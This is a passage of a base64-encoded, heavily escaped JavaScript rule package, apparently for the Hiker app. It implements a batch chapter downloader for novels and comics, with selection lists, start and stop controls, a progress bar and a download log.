ZS9Ub29sLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IGNob29zZVRlYW0gPSBuZXcgU2V0KFRvb2wucmFuZ2Uoc3RhcnQsIGVuZCkpO1xcXFxuICAgICAgICAgICAgbGV0IGJhdGNoVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpiYXRjaFRlYW1cXFxcXFxcIiwgXFxcXFxcXCJbXVxcXFxcXFwiKSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgYmF0Y2hUZWFtID0gYmF0Y2hUZWFtLmZpbHRlcih4ID0+ICFjaG9vc2VUZWFtLmhhcyh4KSk7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOmJhdGNoVGVhbVxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeShiYXRjaFRlYW0pKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIlxcXFxuICAgICAgICB9LCBzdGFydCwgZW5kLCBNWV9JRCksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImljb25fc21hbGxfNFxcXFxcXFwiXFxcXG4gICAgfSk7XFxcXG4gICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogXFxcXFxcXCLnoa7orqTpgInkuK1cXFxcXFxcIixcXFxcbiAgICAgICAgcGljX3VybDogXFxcXFxcXCJodHRwczovL2ltZy5pY29uczguY29tLz9mb3JtYXQ9Z2lmJmlkPXRNcnZ0YzZUOWhWYiZ0b2tlbj1cXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKE1ZX0lEKSA9PiB7XFxcXG4gICAgICAgICAgICBpZiAoZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjppc1N0YXJ0XFxcXFxcXCIsIFxcXFxcXFwiLTFcXFxcXFxcIikgIT09IFxcXFxcXFwiLTFcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5q2j5Zyo5LiL6L295ZOmflxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgbGV0IGJhdGNoVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpiYXRjaFRlYW1cXFxcXFxcIiwgXFxcXFxcXCJbXVxcXFxcXFwiKSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIGJhdGNoVGVhbS5sZW5ndGggPT09IDAgPyBcXFxcXFxcInRvYXN0Oi8v5L2g6L+Y5LuA5LmI6YO95rKh5pyJ6YCJXFxcXFxcXCIgOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9CYXRjaC52aWV3I25vUmVmcmVzaCMjbm9IaXN0b3J5IyNub1JlY29yZEhpc3RvcnkjXFxcXFxcXCI7XFxcXG4gICAgICAgIH0sIE1ZX0lEKSxcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIG5ld1dpbmRvdzogdHJ1ZSxcXFxcbiAgICAgICAgICAgIHdpbmRvd0lkOiBNWV9JRCArIFxcXFxcXFwiLy/mibnph4/kuIvovb1cXFxcXFxcIixcXFxcbiAgICAgICAgICAgIE1ZX0lEOiBNWV9JRCxcXFxcbiAgICAgICAgICAgIGNoYXB0ZXJMaXN0OiBiYWNrdXBDaGFwdGVyTGlzdCxcXFxcbiAgICAgICAgICAgIGluZm86IGluZm9cXFxcbiAgICAgICAgfSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiaWNvbl9zbWFsbF80XFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBzZXRUeXBlKCk7XFxcXG4gICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lX2JsYW5rXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBsZXQgYmF0Y2hUZWFtID0gSlNPTi5wYXJzZShnZXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOmJhdGNoVGVhbVxcXFxcXFwiLCBcXFxcXFxcIltdXFxcXFxcXCIpIHx8IFxcXFxcXFwiW11cXFxcXFxcIik7XFxcXG4gICAgbGV0IGNvbXBsZXRlZCA9IFtdO1xcXFxuICAgIGZvciAobGV0IGkgPSAwLCBpdGVtID0gY2hhcHRlckxpc3RbMF07IGkgPCBjaGFwdGVyTGlzdC5sZW5ndGg7IGl0ZW0gPSBjaGFwdGVyTGlzdFsrK2ldKSB7XFxcXG4gICAgICAgIGxldCBpc19kb3dubG9hZCA9IHJlY29yZC5pbmNsdWRlcyhpdGVtLnRpdGxlKTtcXFxcblxcXFxuICAgICAgICBpZiAoaXNfZG93bmxvYWQpIHtcXFxcbiAgICAgICAgICAgIGNvbXBsZXRlZC5wdXNoKGl0ZW0uQ0lEKTtcXFxcbiAgICAgICAgICAgIGlmICh0YWdGaWx0ZXIgIT09IFxcXFxcXFwiMVxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgY2hhcHRlclRlYW0ucHVzaChjb21GdW4oaXRlbS5DSUQsIGl0ZW0pKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSBlbHNlIGlmICghaXNfZG93bmxvYWQgJiYgdGFnRmlsdGVyICE9PSBcXFxcXFxcIjJcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgY2hhcHRlclRlYW0ucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGJhdGNoVGVhbS5pbmNsdWRlcyhpdGVtLkNJRCkgPyBcXFxcXFxcIuKAmOKAmFxcXFxcXFwiICsgaXRlbS50aXRsZSArIFxcXFxcXFwi4oCZ4oCZXFxcXFxcXCIgOiBpdGVtLnRpdGxlLFxcXFxuICAgICAgICAgICAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKGNsaWNrQ2hvb3NlLCBpdGVtLnRpdGxlLCBNWV9JRCwgaXRlbS5DSUQpLFxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXFxcXFwiI1xcXFxcXFwiICsgaXRlbS5DSURcXFxcbiAgICAgICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBkZWZfRG9WaV9TdHlsZVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgcHV0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpjb21wbGV0ZWRcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkoY29tcGxldGVkKSk7XFxcXG59XFxcXG5zd2l0Y2ggKHZpZXdNb2RlKSB7XFxcXG4gICAgY2FzZSBcXFxcXFxcIjBcXFxcXFxcIjpcXFxcbiAgICAgICAgc2luZ2xlVmlldygpO1xcXFxuICAgICAgICBicmVhaztcXFxcbiAgICBjYXNlIFxcXFxcXFwiMVxcXFxcXFwiOlxcXFxuICAgICAgICBiYXRjaFZpZXcoKTtcXFxcbiAgICAgICAgYnJlYWs7XFxcXG59XFxcXG5pZiAoaXNSZXZlcnNlID09PSBcXFxcXFxcIjFcXFxcXFxcIikge1xcXFxuICAgIGNoYXB0ZXJUZWFtLnJldmVyc2UoKTtcXFxcbn1cXFxcbmxheW91dC5wdXNoLmFwcGx5KGxheW91dCwgY2hhcHRlclRlYW0pO1xcXFxuc2V0UmVzdWx0KGxheW91dCk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwiI3Yu5om56YeP5LiL6L295ZmoXFxcIixcXFwicGF0aFxcXCI6XFxcIkJhdGNoLnZpZXdcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5sZXQge1xcXFxuICAgIGNoYXB0ZXJMaXN0LFxcXFxuICAgIGluZm8sXFxcXG4gICAgTVlfSURcXFxcbn0gPSBNWV9QQVJBTVM7XFxcXG5zZXRQYWdlVGl0bGUoXFxcXFxcXCLkuIvovb3lmah8XFxcXFxcXCIraW5mby5ib29rTmFtZSk7XFxcXG5hZGRMaXN0ZW5lcihcXFxcXFxcIm9uQ2xvc2VcXFxcXFxcIiwgJC50b1N0cmluZygoTVlfSUQpID0+IHtcXFxcbiAgICBjbGVhck15VmFyKE1ZX0lEICsgXFxcXFxcXCI6aXNTdGFydFxcXFxcXFwiKTtcXFxcbiAgICBjbGVhck15VmFyKE1ZX0lEICsgXFxcXFxcXCI6c3RhdHVzXFxcXFxcXCIpO1xcXFxuICAgIGNsZWFyTXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpiYXRjaFRlYW1cXFxcXFxcIik7XFxcXG4gICAgLy9yZWZyZXNoUGFnZSgpO1xcXFxufSwgTVlfSUQpKTtcXFxcblxcXFxubGV0IGlzU3RhcnQgPSBnZXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOmlzU3RhcnRcXFxcXFxcIiwgXFxcXFxcXCIwXFxcXFxcXCIpO1xcXFxubGV0IHN0YXR1cyA9IGdldE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6c3RhdHVzXFxcXFxcXCIsIFxcXFxcXFwiMFxcXFxcXFwiKTtcXFxcbmxldCBsYXlvdXQgPSBbXTtcXFxcblxcXFxubGV0IGJhdGNoVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpiYXRjaFRlYW1cXFxcXFxcIiwgXFxcXFxcXCJbXVxcXFxcXFwiKSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxuaWYodHlwZW9mIGNoYXB0ZXJMaXN0ID09PSBcXFxcXFxcInN0cmluZ1xcXFxcXFwiKXtcXFxcbiAgICBjaGFwdGVyTGlzdCA9IEpTT04ucGFyc2UocmVxdWVzdChcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIitjaGFwdGVyTGlzdCl8fFxcXFxcXFwiW11cXFxcXFxcIik7XFxcXG59XFxcXG5sZXQgY2hhcHRlclRlYW0gPSBiYXRjaFRlYW0ubWFwKHYgPT4ge1xcXFxuICAgIGxldCBjaGFwdGVySXRlbSA9IGNoYXB0ZXJMaXN0W3ZdO1xcXFxuICAgIGNoYXB0ZXJJdGVtLkNJRCA9IHY7XFxcXG4gICAgcmV0dXJuIGNoYXB0ZXJJdGVtO1xcXFxufSk7XFxcXG5pZiAoaXNTdGFydCA9PT0gXFxcXFxcXCIwXFxcXFxcXCIpIHtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuW8gOWni+S4i+i9vVtcXFxcXFxcIiArIGNoYXB0ZXJUZWFtLmxlbmd0aCArIFxcXFxcXFwiXVxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoY2hhcHRlclRlYW0sIGluZm8sIE1ZX0lEKSA9PiB7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOmlzU3RhcnRcXFxcXFxcIiwgXFxcXFxcXCIxXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICAgICAgbGV0IGRvd25sb2FkID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0JhdGNoU3RhdGlzdGljcy5qc1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGlmKGluZm8udHlwZT09PVxcXFxcXFwiY29taWNcXFxcXFxcIiYmaW5mby5jb21pY1NjaGVtZT09PVxcXFxcXFwiMVxcXFxcXFwiKXtcXFxcbiAgICAgICAgICAgICAgICBkb3dubG9hZD1kb3dubG9hZC5iO1xcXFxuICAgICAgICAgICAgfWVsc2V7XFxcXG4gICAgICAgICAgICAgICAgZG93bmxvYWQ9ZG93bmxvYWQuYTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHJldHVybiBkb3dubG9hZChjaGFwdGVyVGVhbSwgaW5mbywgTVlfSUQpIHx8IFxcXFxcXFwidG9hc3Q6Ly/kuIvovb3plJnor69cXFxcXFxcIjtcXFxcbiAgICAgICAgfSwgY2hhcHRlclRlYW0sIGluZm8sIE1ZX0lEKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF9jZW50ZXJfMVxcXFxcXFwiLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcXFxcXCJ8fOW8gOWni+S4i+i9vVxcXFxcXFwiXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuS7u+WKoeWIl+ihqO+8mlxcXFxcXFwiLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIixcXFxcbiAgICB9KTtcXFxcbiAgICBmb3IgKGxldCBpdGVtIG9mIGNoYXB0ZXJUZWFtKSB7XFxcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBpdGVtLnRpdGxlLFxcXFxuICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMlxcXFxcXFwiXFxcXG4gICAgICAgIH0pO1xcXFxuICAgIH1cXFxcblxcXFxufSBlbHNlIHtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuS4i+i9vei/m+W6pjowL1xcXFxcXFwiK2NoYXB0ZXJUZWFtLmxlbmd0aCxcXFxcbiAgICAgICAgZGVzYzogXFxcXFxcXCLigJzigJzigJ3igJ3ilofilofilofilofilofilofilofilofilofilodcXFxcXFxcIi5mb250Y29sb3IoXFxcXFxcXCIjZTVlMWU0XFxcXFxcXCIpK1xcXFxcXFwiIDAlXFxcXFxcXCIsXFxcXG4gICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCIsXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXFxcXFwifHzkuIvovb3ov5vluqZcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcXFxuICAgICAgICB9XFxcXG4gICAgfSk7XFxcXG4gICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogXFxcXFxcXCLlkI7lj7DkuIvovb1cXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiBcXFxcXFxcImZ1bmM6Ly9iYWNrZ3JvdW5kXFxcXFxcXCIsXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMlxcXFxcXFwiXFxcXG4gICAgfSk7XFxcXG5cXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBbXFxcXFxcXCJb5Y+W5raI5LiL6L29XVxcXFxcXFwiLCBcXFxcXFxcIlvmraPlnKjlgZzmraIuLi5dXFxcXFxcXCIsIFxcXFxcXFwiW+i/lOWbnl1cXFxcXFxcIiwgXFxcXFxcXCJb5aSE55CG5aSx6LSlXVxcXFxcXFwiLCBcXFxcXFxcIlvph43mlrDlvIDlp4tdXFxcXFxcXCJdW3N0YXR1c10sXFxcXG4gICAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChNWV9JRCkgPT4ge1xcXFxuICAgICAgICAgICAgbGV0IHN0YXR1cyA9IGdldE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6c3RhdHVzXFxcXFxcXCIsIFxcXFxcXFwiMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGlmIChzdGF0dXMgPT09IFxcXFxcXFwiMFxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpzdGF0dXNcXFxcXFxcIiwgXFxcXFxcXCIxXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oe1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCJb5q2j5Zyo5YGc5q2iLi4uXVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcXFxcXCJ8fOS4i+i9veaOp+WItlxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+ato+WcqOWPlua2iOS4i+i9veS7u+WKoVxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgfSBlbHNlIGlmIChzdGF0dXMgPT09IFxcXFxcXFwiMVxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/mraPlnKjmmoLlgZwuLi5cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoc3RhdHVzID09PSBcXFxcXFxcIjJcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgIGJhY2soKTtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+W3sumAgOWHuuS4i+i9veWZqFxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgfSBlbHNlIGlmIChbXFxcXFxcXCIzXFxcXFxcXCIsIFxcXFxcXFwiNFxcXFxcXFwiXS5pbmNsdWRlcyhzdGF0dXMpKSB7XFxcXG4gICAgICAgICAgICAgICAgY2xlYXJNeVZhcihNWV9JRCArIFxcXFxcXFwiOmlzU3RhcnRcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgY2xlYXJNeVZhcihNWV9JRCArIFxcXFxcXFwiOnN0YXR1c1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICBjbGVhck15VmFyKE1ZX0lEICsgXFxcXFxcXCI6bG9nXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/ph43mlrDngrnlh7vkuIvovb1cXFxcXFxcIlxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9LCBNWV9JRCksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMlxcXFxcXFwiLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcXFxcXCJ8fOS4i+i9veaOp+WItlxcXFxcXFwiXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVfYmxhbmtcXFxcXFxcIlxcXFxuICAgIH0pO1xcXFxuICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwiPHN0cm9uZz7kuIvovb3ml6Xlv5c8L3N0cm9uZz5cXFxcXFxcIi5iaWcoKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCIsXFxcXG4gICAgICAgIFxcXFxuICAgIH0pO1xcXFxuICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwibGluZVxcXFxcXFwiLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcXFxcXCJ8fOaXpeW/l1xcXFxcXFwiXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOlxcXFxcXFwi4oCc4oCc4oCd4oCdJD5cXFxcXFxcIitcXFxcXFxcIuW8gOWni+S4i+i9vS4uLi4uLlxcXFxcXFwiLmZvbnRjb2xvcihcXFxcXFxcIiMwMGZmMDBcXFxcXFxcIiksXFxcXG4gICAgICAgIHVybDpcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIixcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCIsXFxcXG4gICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICBpZDogTVlfSUQgKyBcXFxcXFxcIiNsb2cjMFxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgbGluZVZpc2libGU6ZmFsc2VcXFxcbiAgICAgICAgfVxcXFxuICAgIH0pO1xcXFxufVxcXFxuXFxcXG5zZXRSZXN1bHQobGF5b3V0KTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCIjZmcu5om56YeP5LiL6L2957uf6K6hXFxcIixcXFwicGF0aFxcXCI6XFxcIkJhdGNoU3RhdGlzdGljcy5qc1xcXCIsXFxcInJ1bGVcXFwiOlxcXCJjb25zdCBUb29sID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL1Rvb2wuanNcXFxcXFxcIik7XFxcXG5jb25zdCBDb25maWcgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcXFxcXCIpO1xcXFxuXFxcXG4kLmV4cG9ydHMuYSA9IGZ1bmN0aW9uKGNoYXB0ZXJUZWFtLCBpbmZvLCBNWV9JRCkge1xcXFxuICAgIGlmIChjaGFwdGVyVGVhbS5sZW5ndGggPT09IDApIHtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/nqbrnmoTkuIvovb3pmJ/liJdcXFxcXFxcIjtcXFxcbiAgICB9XFxcXG5cXFxcbiAgICB2YXIgY291bnQgPSAwO1xcXFxuICAgIHZhciB0YXNrQ291bnQgPSBjaGFwdGVyVGVhbS5sZW5ndGg7XFxcXG4gICAgdmFyIHN1Y2Nlc3NDSUQgPSBbXTtcXFxcbiAgICB2YXIgZmFpbE5hbWUgPSBbXTtcXFxcbiAgICB2YXIgbG9nQ291bnQgPSAxO1xcXFxuICAgIHZhciB0YXNrVGVhbSA9IGNoYXB0ZXJUZWFtLm1hcChjaGFwdGVySXRlbSA9PiAoe1xcXFxuICAgICAgICBmdW5jOiB0YXNrLFxcXFxuICAgICAgICBpZDogY2hhcHRlckl0ZW0udGl0bGUsXFxcXG4gICAgICAgIHBhcmFtOiB7XFxcXG4gICAgICAgICAgICBjaGFwdGVySXRlbTogY2hhcHRlckl0ZW0sXFxcXG4gICAgICAgICAgICBpbmZvOiBpbmZvLFxcXFxuICAgICAgICAgICAgTVlfSUQ6IE1ZX0lEXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KSk7XFxcXG4gICAgbGV0IGxvZ051bSA9IENvbmZpZy5sb2dOdW07XFxcXG4gICAgbGV0IGxvZ0RhdGUgPSAwO1xcXFxuICAgIGZ1bmN0aW9uIHB1dExvZyh0ZXh0KSB7XFxcXG4gICAgICAgIGxvZyh0ZXh0KTtcXFxcbiAgICAgICAgbGV0IG5vd0RhdGU9RGF0ZS5ub3coKTtcXFxcbiAgICAgICAgaWYoKG5vd0RhdGUtbG9nRGF0ZSk8NTAwKXtcXFxcbiAgICAgICAgICAgIHJldHVybjtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBsb2dEYXRlPW5vd0RhdGU7XFxcXG4gICAgICAgIGlmIChsb2dDb3VudCA+PSBsb2dOdW0pIHtcXFxcbiAgICAgICAgICAgIGRlbGV0ZUl0ZW0oTVlfSUQgKyBcXFxcXFxcIiNsb2cjXFxcXFxcXCIgKyAobG9nQ291bnQgLSAxMCkpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGFkZEl0ZW1BZnRlcihNWV9JRCArIFxcXFxcXFwifHzml6Xlv5dcXFxcXFxcIiwge1xcXFxuICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIiQ+XFxcXFxcXCIgKyB0ZXh0LFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZSxcXFxcbiAgICAgICAgICAgICAgICBpZDogTVlfSUQgKyBcXFxcXFxcIiNsb2cjXFxcXFxcXCIgKyBsb2dDb3VudFxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgbG9nQ291bnQrKztcXFxcbiAgICB9XFxcXG4gICAgZnVuY3Rpb24gdGFzayh0YXNrUGFyYW0pIHtcXFxcbiAgICAgICAgbGV0IHJlc3VsdCA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9CYXRjaC5leGUuanNcXFxcXFxcIikodGFza1BhcmFtKTtcXFxcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcXFxcbiAgICB9XFxcXG5cXFxcbiAgICBmdW5jdGlvbiBsaXN0ZW5lcihwZXJjaCwgaWQsIGVycm9yLCBDSUQpIHtcXFxcbiAgICAgICAgY291bnQrKztcXFxcbiAgICAgICAgbGV0IGlzU3VjY2VzcyA9IGZhbHNlO1xcXFxuICAgICAgICBpZiAoZXJyb3IgIT0gbnVsbCkge1xcXFxuICAgICAgICAgICAgZmFpbE5hbWUucHVzaChpZCk7XFxcXG4gICAgICAgICAgICBwdXRMb2coXFxcXFxcXCJbbGlzdGVuZXJd5LiL6L295aSx6LSl77yaXFxcXFxcXCIgKyBpZCArIFxcXFxcXFwiPEVSUk9SQCBcXFxcXFxcIiArIGVycm9yICsgXFxcXFxcXCI+XFxcXFxcXCIpO1xcXFxuICAgICAgICB9IGVsc2UgaWYgKENJRCA+PSAwKSB7XFxcXG4gICAgICAgICAgICBzdWNjZXNzQ0lELnB1c2goQ0lEKTtcXFxcbiAgICAgICAgICAgIGxldCByYXRpbyA9IChjb3VudCAvIHRhc2tDb3VudCkudG9GaXhlZCg0KTtcXFxcbiAgICAgICAgICAgIGxldCBzdHJpcENvdW50ID0gTWF0aC5jZWlsKHJhdGlvICogMTApO1xcXFxuICAgICAgICAgICAgaXNTdWNjZXNzID0gdHJ1ZTtcXFxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuS4i+i9vei/m+W6pu+8mlxcXFxcXFwiICsgc3VjY2Vzc0NJRC5sZW5ndGggKyBcXFxcXFxcIi9cXFxcXFxcIiArIHRhc2tDb3VudCxcXFxcbiAgICAgICAgICAgICAgICBkZXNjOiBcXFxcXFxcIuKAnOKAnOKAneKAnVxcXFxcXFwiICsgXFxcXFxcXCLilodcXFxcXFxcIi5yZXBlYXQoc3RyaXBDb3VudCkuZm9udGNvbG9yKFxcXFxcXFwiI2ZmYWMyZFxcXFxcXFwiKSArIFxcXFxcXFwi4paHXFxcXFxcXCIucmVwZWF0KDEwIC0gc3RyaXBDb3VudCkuZm9udGNvbG9yKFxcXFxcXFwiI2U1ZTFlNFxcXFxcXFwiKSArIFxcXFxcXFwiIFxcXFxcXFwiICsgU3RyaW5nKChyYXRpbyAqIDEwMCkpLnNsaWNlKDAsIDUpICsgXFxcXFxcXCIlXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcXFxcXCJ8fOS4i+i9vei/m+W6plxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICBwdXRMb2coXFxcXFxcXCJbbGlzdGVuZXJd5bey5a6M5oiQ5LiL6L2977yaXFxcXFxcXCIgKyBpZCk7XFxcXG4gICAgICAgIH0gZWxzZSBpZiAoQ0lEID09PSAtMSkge1xcXFxuICAgICAgICAgICAgZmFpbE5hbWUucHVzaChpZCk7XFxcXG4gICAgICAgICAgICBwdXRMb2coXFxcXFxcXCJbbGlzdGVuZXJd5bey5YGc5q2i77yaXFxcXFxcXCIgKyBpZCk7XFxc